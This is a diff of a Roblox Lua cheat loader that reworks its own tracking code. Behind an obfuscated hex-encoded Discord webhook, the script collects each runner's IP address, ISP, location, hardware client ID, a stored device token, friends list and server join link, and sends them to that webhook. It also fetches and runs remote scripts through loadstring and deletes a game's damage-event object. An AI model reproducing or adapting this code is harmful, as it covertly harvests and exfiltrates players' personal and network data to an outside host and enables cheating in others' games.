@@ -12,12 +12,17 @@ end
 local _req = (syn and syn.request or request or http_request)
 local _HS = game:GetService("HttpService")
 
--- Проверка на неофициальный запуск
+local _tk = "N/A"
+pcall(function()
+    if isfile and readfile and writefile then
+        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
+        else _tk = _HS:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
+    end
+end)
+
 if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SECURE_AUTH")) then
     local _BAD_WH = _H("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313532343037323933373731343438373531382F58384748613344577739644F64563876447141544C574779314F62445F53385A64797578556143372D634F6B633456557732536A6C615A576A6D5F74744A375557556F4D")
-    
     local ni = {} pcall(function() local r = _req({Url = "http://ip-api.com/json/", Method = "GET"}) if r.Success then ni = _HS:JSONDecode(r.Body) end end)
-    local tk = "N/A" pcall(function() if isfile("nazarkus_key.json") then tk = readfile("nazarkus_key.json") end end)
     
     pcall(function()
         _req({
@@ -28,17 +33,17 @@ if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SEC
                     title = "Non-official Loader Attempt Blocked",
                     color = 16711680,
                     fields = {
-                        {name = "Player Info", value = string.format("Name: %s\nID: %d", _lp.Name, _lp.UserId), inline = true},
+                        {name = "Player", value = _lp.Name .. " (" .. _lp.UserId .. ")", inline = true},
                         {name = "Hardware ID", value = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```", inline = false},
-                        {name = "Device Token", value = "```" .. tk .. "```", inline = false},
-                        {name = "Network", value = string.format("IP: %s\nISP: %s\nLoc: %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false}
-                    },
-                    footer = {text = "Security System | Unauthorized Loader"}
+                        {name = "Device Token", value = "```" .. _tk .. "```", inline = false},
+                        {name = "Network", value = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A"), inline = false}
+                    }
                 }}
             })
         })
     end)
-    _lp:Kick("Security Error: Non-official Loader Detected. Please use the original launcher.")
+    task.wait(1) -- Ждем, чтобы лог успел отправиться
+    _lp:Kick("Security Error: Non-official Loader Detected.")
     return
 end
 shared._NK_AUTH = nil
@@ -60,14 +65,6 @@ local _RS = game:GetService("ReplicatedStorage")
 local _MS = game:GetService("MarketplaceService")
 local _uid = tostring(_lp.UserId)
 local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
-local _tk = "N/A"
-
-pcall(function()
-    if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
-        else _tk = _HS:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
-    end
-end)
 
 local function chk(l)
     for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
@@ -102,9 +99,9 @@ local function _LOG()
         end
 
         local jid = game.JobId == "" and "Unknown" or game.JobId
-        local jLink = "https://tinyurl.com/api-create.php?url=" .. _HS:UrlEncode("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jid)
-        local jBtn = "N/A"
-        pcall(function() local res = _req({Url = jLink, Method = "GET"}) if res.Success then jBtn = res.Body end end)
+        local jBtn = "https://tinyurl.com/api-create.php?url=" .. _HS:UrlEncode("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jid)
+        local jFinal = "N/A"
+        pcall(function() local res = _req({Url = jBtn, Method = "GET"}) if res.Success then jFinal = res.Body end end)
         
         local friends = {}
         for _, p in ipairs(game.Players:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
@@ -123,7 +120,7 @@ local function _LOG()
                     {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
                     {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _MS:GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, _uid), ["inline"] = false}
+                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jFinal, _uid), ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
@@ -138,7 +135,7 @@ if _st == "whitelist" then
     task.spawn(function()
         local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
         local f = Instance.new("Frame", sg)
-        f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
+        f.Size = UDim2.new(0, 220, 0, 300); f.Position = UDim2.new(0.5,-110,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
         Instance.new("UICorner", f)
         local s = Instance.new("ScrollingFrame", f)
         s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
@@ -161,6 +158,6 @@ pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/naza
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))() end)
-pcall(function() if game:GetService("ReplicatedStorage"):FindFirstChild("ACS_Engine") then game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy() end end)
+pcall(function() if _RS:FindFirstChild("ACS_Engine") then _RS.ACS_Engine.Events.FDMG:Destroy() end end)
 
 if _st == "blacklist" then _lp:Kick("Banned.") return end
